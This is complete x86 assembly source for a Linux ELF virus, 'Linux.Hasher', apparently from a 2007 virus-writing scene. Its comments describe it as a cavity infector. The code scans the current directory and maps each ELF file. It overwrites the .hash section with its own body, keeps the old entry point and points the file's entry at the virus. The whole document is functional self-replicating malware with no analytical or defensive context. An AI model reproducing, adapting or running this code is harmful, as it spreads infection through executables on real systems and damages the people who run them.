   ; Linux.Hasher (x) 2007, herm1t <herm1t@vx.netlux.org>
   ; Features:
   ;  - cavity infector, replaces .hash section, file size will not be increased
   ;  - no delta, address of the virus saved in the body upon infection
   %macro movb 2
       %if %2 == 0
           xor     %1, %1
       %else
               push    byte %2
               pop     %1
       %endif
   %endmacro
           BITS    32
           CPU 486
           global  _start
   _start:     push    strict dword fake_host
           pusha
           enter   268,0           ; sizeof(dirent)
           push    '.'
           mov ebx, esp
           movb    eax, 5
           movb    ecx, 0
           int 0x80
           or  eax, eax
           js  .vr
           xchg    eax, ebx
   .rd:        mov ecx, esp
           movb    eax, 89
           int 0x80
           dec eax
           jz  infect
   .vc:        movb    eax, 6
           int 0x80
   .vr:        leave
           popa
                   ret
   infect:     pusha
           mov al, 5
           lea ebx, [esp + 32 + 10]    ; d_name
           movb    ecx, 2
           int 0x80
           or  eax, eax
           js  .ir
           xchg    eax, ebx
                   movb    eax, 19
           mov edx, ecx
           sub ecx, ecx
           int 0x80
           xchg    eax, edx
           pusha
           mov ecx, edx
           mov edi, ebx
           mov al, 192
           xor     ebx, ebx
           movb    edx, 3
           movb    esi, 1
           xor     ebp, ebp
           int     0x80
           mov [esp + 28], eax
           bswap   eax
           inc ax          ; > 0xffff0000
           popa
           jz  .ic
           xchg    eax, esi
           mov eax, dword [esi]    ; ? 0x464c457f
           xor eax, dword [esi + 16]   ; ? 0x00030002
           add eax, 0xb9b0ba83
           jnz .iu
           mov edi, [esi + 32]     ; e_shoff
           add edi, esi
           movzx   ecx, word [esi + 48]    ; e_shnum
   .hl:        cmp dword [edi + 4], 5  ; sh_type == SHT_HASH
           je  .fh
           add edi, 40
           loop    .hl
   .iu:        push    ebx
           mov al, 91
           mov ebx, esi
           mov ecx, edx
           int 0x80
           pop ebx
   .ic:        movb    eax, 6
           int 0x80
   .ir:        popa
           jmp _start.rd
   .fh:        mov cl, _size       ; even bash has 30 sections
           cmp ecx, [edi + 20]     ; sh_size
           ja  .iu
           mov ebp, [edi + 16]
           add ebp, esi
           mov eax, [ebp]      ; already infected?
           dec eax
           jz  .iu
           pusha
           cld
           mov edi, ebp
           movb    eax, 1
           stosd               ; nbuckets
           dec eax
           stosd               ; nchains
           stosd               ; buckets[0]
           mov esi, strict dword _start
   _self       equ $-_start-4
           rep movsb
           popa
           mov eax, [esi + 24]     ; e_entry
           mov [ebp + 13], eax     ; save old entry
           mov eax, [edi + 12]     ; sh_addr
           lea eax, [eax + 12]
           mov [ebp + 12 + _self], eax
           mov [esi + 24], eax     ; e_entry
           jmp .iu
   _size       equ $-_start
   fake_host:  mov eax,1
           int 0x80
